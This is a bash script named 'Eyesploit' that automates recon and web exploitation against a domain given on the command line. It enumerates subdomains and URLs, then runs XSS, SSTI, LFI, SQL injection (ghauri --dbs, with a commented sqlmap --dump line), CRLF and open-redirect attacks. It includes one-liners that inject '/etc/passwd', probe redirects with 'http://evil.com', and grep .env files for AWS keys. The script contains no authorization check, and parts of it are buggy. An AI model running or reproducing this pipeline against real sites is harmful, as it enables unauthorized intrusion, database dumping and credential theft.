#!/bin/bash

## colors
BOLD="\e[1m"
CYAN='\033[0;36m'
RED='\033[0;31m'
black='\033[0;30m'
green='\033[0;32m'
yellow='\033[0;33m'
magenta='\033[0;35m'
NC='\033[0m' # No Color
echo -e "$RED${BOLD} -                                                                  - ${NC}"
echo -e "$CYAN${BOLD}███████╗██╗░░░██╗███████╗░██████╗██████╗░██╗░░░░░░█████╗░██╗████████╗${NC}"
echo -e "$CYAN${BOLD}██╔════╝╚██╗░██╔╝██╔════╝██╔════╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝${NC}"
echo -e "$CYAN${BOLD}█████╗░░░╚████╔╝░█████╗░░╚█████╗░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░${NC}"
echo -e "$CYAN${BOLD}██╔══╝░░░░╚██╔╝░░██╔══╝░░░╚═══██╗██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░${NC}"
echo -e "$CYAN${BOLD}███████╗░░░██║░░░███████╗██████╔╝██║░░░░░███████╗╚█████╔╝██║░░░██║░░░${NC}"
echo -e "$CYAN${BOLD}╚══════╝░░░╚═╝░░░╚══════╝╚═════╝░╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░${NC}"
echo -e "$RED${BOLD} -                                                                  - ${NC}"
echo -e "$magenta Scan/Exploit - by @$green${BOLD}00xZ$NC /$green${BOLD} Eyezik     ${NC}"

echo " "
help() {
    echo -e "$CYAN${BOLD}Usage:${NC}"
    echo -e "    --help            Shows the help menu${NC}"
    echo -e "    --scan           Subdomains/gau or waymore/pars{NC}"
    echo -e "$green${BOLD}    --lscan           Subdomains/gau/pars{NC}"
    #echo -e "$green${BOLD}    --odd-scan           FFuF Sub domains then direcotries{NC}"
    echo -e "$green${BOLD}    --ts           FFuF Sub domains then direcotries{NC}"
    echo -e "${BOLD}    --exploit           Subenum + alive + params + vuln${NC}"
    echo -e "$RED    --custom           Custom exploit modules ${NC}"
    echo -e "$magenta    --xss           xss scan only(dalfox)${NC}"
    echo -e "$magenta    --lfi           LFI scan with LFIscanner${NC}"
    echo -e "$magenta    --ssti           SSTI scan with TPLmap${NC}"
    echo -e "$magenta    --csrf           CSRF (crlfuzz)${NC}"
    echo -e "$magenta    --sqli           Sql Injection${NC}"
    exit 0
}

if [ "$1" == "--help" ]; then
    help
fi

domain=$2


vuln1() {
        if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    read -p " [?] Deep scan(d) or light scan(l)? [d/l]: " sub
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    if [[ $sub == 'l' || $sub == 'L' ]]; then
            trap : SIGINT
            echo -e "$green [+]$CYAN Get All Urls "
            gau $domain > output/$domain/raw_urls.txt
            echo -e "$green [+]$RED Sub Finder "
            subfinder -d $domain -silent -all | anew output/$domain/subs.txt
            echo -e "$green [+]$yellow Sub Life Check "
            cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
    else
            trap : SIGINT
            waymore -i $domain -oU output/$domain/raw_urls.txt
    fi

    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
    rm output/$domain/raw_urls.txt
    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Compacting... "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
    echo -e "$yellow [+]$green${BOLD} [!] Crawling Domain [!] "
    katana -u $domain | anew output/$domain/spider_top-domain.txt
    echo -e "$yellow [+]$CYAN${BOLD} [!] Crawling Subdomains [!] "
    katana -list output/$domain/subs_alive.txt | anew output/$domain/Spidered_subs.txt
    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
    dirsearch -l ~/eye/output/$domain/subs_alive.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o ~/eye/output/$domain/hidden_dir.txt

}

vuln2() {
    mkdir -p output/$domain/xray
    echo -e "$CYAN$HTTP Scanning ${NC}"
    httpx -silent -l output/$domain/subs.txt | anew output/$domain/alive.txt

    echo -e "$CYANParameters search${NC}"
    paramspider -l output/$domain/alive.txt && mv results output/$domain/
    #cd results/
    cat output/$domain/results/* > output/$domain/params.txt

    echo -e "$RED${BOLD} \n Vulnerability Scanning \n${NC}"
    cd tools/
    nuclei ../output/$domain/params.txt -t file/logs -t exposures/files -t cves/ | anew ../output/$domain/_nuclei.txt
    cat ../output/$domain/params.txt | xargs -I @ sh -c './xray_linux_amd64 ws --url @ --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal,crlf-injection,dirscan --html-output ../output/$domain/xray/"xray_$(echo @ | tr / _).html"'
}

vuln3() {
        echo -e "$RED${BOLD} --- $green${BOLD}Custom Exploitation Scanning $RED${BOLD}--- ${NC} \n"
    echo -e "$yellow${BOLD} \n [!] SSTI Scan: \n$CYAN"
    for url in $(cat output/$domain/gxss_dump.txt); do python3.9 tools/tplmap/tplmap.py -u $url; anew output/$domain/VULN_ssti; done
    [ -s output/$domain/VULN_ssti.txt ] && echo -e "$green${BOLD} [+] FOUND VULN SSTI [+] Check output/$domain/VULN_ssti.txt for output ${NC}" || echo -e "$RED [+] No SSTI Found[+] ${NC}"
    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file
    for url in $(cat output/$domain/lfi_qsr.txt); do python3 tools/LFIscanner/LFIscanner.py -t $url -p tools/LFIscanner/payloads.txt; print $url; anew output/$domain/VULN_lfi; done
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    #cat output/$domain/sqli.txt
    #python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
    for url in $(cat output/$domain/sqli.txt); do python3 tools/ScanQLi/scanqli.py -u $url -o output/$domain/VULN_sqli; print $url; anew output/$domain/VULN_sqli; done
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
    #for url in $(cat output/$domain/ssti.txt); do python3.9 tools/tplmap/tplmap.py -u $url; print $url; done #if error make sure to not use python 3.11 or above #another fix for tplmap: https://github.com/epinna/tplmap/issues/118
    echo -e "$green${BOLD} \n [!] XSS Scan: \n${NC}"
    cat output/$domain/gxss_dump.txt | dalfox pipe | anew output/$domain/VULN_xss.txt
    [ -s output/$domain/VULN_xss.txt ] && echo -e "$yellow${BOLD} [+] FOUND VULN XSS [+] Check output/$domain/VULN_xss.txt for output ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
    echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
    crlfuzz -l output/$domain/subs_alive.txt -o output/$domain/VULN_csrf.txt
    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] FOUND VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
    cat output/$domain/subs.txt | httpx -silent -path ".env",".mysql_history","echo $(echo $(</dev/stdin) | cut -d "." -f2).sql" -mc 200 -ports 80,443,8080,8443 | grep -E -i "AKIA[A-Z0-9]{16}" | anew output/$domain/VULN_keys.txt
    cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"' | anew VULN_lfi.txt
    cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host $green${BOLD} Open Redir. Vulnerable\n" ;done
    cat output/$domain/sqli.txt | parallel -j 50 'ghauri -u '{}' --dbs --hostname --confirm --batch' | anew output/$domain/VULN_sqli.txt
}
lscan() {
    if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    trap : SIGINT
    echo -e "$green [+]$CYAN Get All Urls "
    gau $domain > output/$domain/raw_urls.txt
    echo -e "$green [+]$RED Sub Finder "
    subfinder -d $domain -silent -all | anew output/$domain/subs.txt
    echo -e "$green [+]$yellow Sub Life Check "
    cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
    cat output/$domain/raw_urls.txt | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew output/$domain/js.txt


    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
    rm output/$domain/raw_urls.txt
    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Compacting... "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
    echo -e "$yellow [+]$CYAN${BOLD} [!] Crawling Subdomains [!] "
    katana -list output/$domain/subs_alive.txt | anew output/$domain/Spidered_subs.txt
    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
}
of() {
    if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    trap : SIGINT
    echo -e "$green [+]$CYAN Get All Urls "
    gau $domain > output/$domain/raw_urls.txt
    echo -e "$green [+]$RED Sub Finder "
    subfinder -d $domain -silent -all | anew output/$domain/subs.txt
    echo -e "$green [+]$yellow Sub Life Check "
    cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
    cat output/$domain/raw_urls.txt | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew output/$domain/js.txt
    #echo -e "$green [+]$yellow Fuzzing Subdomains"
    #ffuf -w fuzzing/subdomains.txt -u http://$domain/ -H “Host: FUZZ.$domain.com” -lf 1 -of


    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
    rm output/$domain/raw_urls.txt
    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Compacting... "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
    echo -e "$yellow [+]$CYAN${BOLD} [!] Crawling Subdomains [!] "
    katana -list output/$domain/subs_alive.txt | anew output/$domain/Spidered_subs.txt
    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
}
xss() {
    echo -e "$green${BOLD} \n [!] XSS Scan: \n${NC}"
    cat output/$domain/gxss_dump.txt | dalfox pipe | anew output/$domain/VULN_xss.txt
    [ -s output/$domain/VULN_xss.txt ] && echo -e "$yellow${BOLD} [+] FOUND VULN XSS [+] Check output/$domain/VULN_xss.txt for output ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
}
ssti() {
    echo -e "$yellow${BOLD} \n [!] SSTI Scan: \n$CYAN"
    for url in $(cat output/$domain/gxss_dump.txt); do python3.9 tools/tplmap/tplmap.py -u $url; anew output/$domain/VULN_ssti; done
    [ -s output/$domain/VULN_ssti.txt ] && echo -e "$green${BOLD} [+] FOUND VULN SSTI [+] Check output/$domain/VULN_ssti.txt for output ${NC}" || echo -e "$RED [+] No SSTI Found[+] ${NC}"

}
keys(){
        echo -e "$CYAN${BOLD} [!]$green Dumping API Keys $CYAN[!] ${NC}"
        cat output/$domain/js.txt | mantra | anew output/$domain/api_keys.txt
        main_loop

}
touchy_scan() {
    if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    echo -e "$CYAN${BOLD} [+] FUZZING ${NC}" 
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    trap : SIGINT
    
    echo -e "$green [+]$yellow Fuzzing Subdomains"
    ffuf -rate 25 -w fuzzing/sub5k -u https://$domain/ -H "Host: FUZZ.$domain.com" -fl 1 -of output/$domain/subs_fuzzed.txt
    for urlfuzz in $(cat output/$domain/subs_fuzzed.txt); do ffuf -rate 25 -w fuzzing/dirsmall -u https://$urlfuzz/FUZZ -lf 1 -of output/$domain/raw_urls.txt; print $urlfuzz; anew output/$domain/raw_urls_debug; done
    #ffuf -w fuzzing/dir_list.list -u https://$domain/FUZZ -fl 1 -of output/$domain/subs_fuzzed.txt


    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
    rm output/$domain/raw_urls.txt
    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Getting JavaScripts "
    cat output/$domain/raw_urls.txt | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew output/$domain/js.txt
    echo -e "$green [+]$magenta Compacting... "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
}
lfi() {
    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file
    for url in $(cat output/$domain/lfi_qsr.txt); do python3 tools/LFIscanner/LFIscanner.py -t $url -p tools/LFIscanner/payloads.txt; print $url; anew output/$domain/VULN_lfi; done
}
csrf() {
    echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
    crlfuzz -l output/$domain/subs_alive.txt -o output/$domain/VULN_csrf.txt
    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] FOUND VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
}
dbinj() { # ignore
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    cat output/$domain/sqli.txt
    python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
}
dbinj2() { ## can ignore 
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    #cat output/$domain/sqli.txt
    #python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
    for url in $(cat output/$domain/sqli.txt); do python3 tools/ScanQLi/scanqli.py -u $url -o output/$domain/VULN_sqli; print $url; anew output/$domain/VULN_sqli; done
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
}
sqli() {
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    #cat output/$domain/sqli.txt
    python3 tools/SqliSniper/sqlisniper.py --payload tools/SqliSniper/payloads.txt --headers tools/SqliSniper/headers.txt -r output/$domain/sqli.txt | anew output/$domain/VULN_sqli
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
    ##run sqlmap here? sure
    #for url in $(cat output/$domain/VULN_sqli.txt); do sqlmap -u $url --batch --level=3 --risk=3 --dump; print $url; anew output/$domain/Database_dump.txt; done
}
if [ "$1" == "--scan" ]; then
    vuln1
elif [ "$1" == "--exploit" ]; then
    vuln2
elif [ "$1" == "--lscan" ]; then
    lscan
elif [ "$1" == "--odd-scan" ]; then
    of
elif [ "$1" == "--ts" ]; then
    touchy_scan
elif [ "$1" == "--xss" ]; then
    xss
elif [ "$1" == "--ssti" ]; then
    ssti
elif [ "$1" == "--sqli" ]; then
    sqli
elif [ "$1" == "--lfi" ]; then
    lfi
elif [ "$1" == "--csrf" ]; then
    csrf
elif [ "$1" == "--database" ]; then
    dbinj
elif [ "$1" == "--database2" ]; then
    dbinj2
else
    echo -e "${RED}Unknown option: $1 ${NC}"
    help
fi
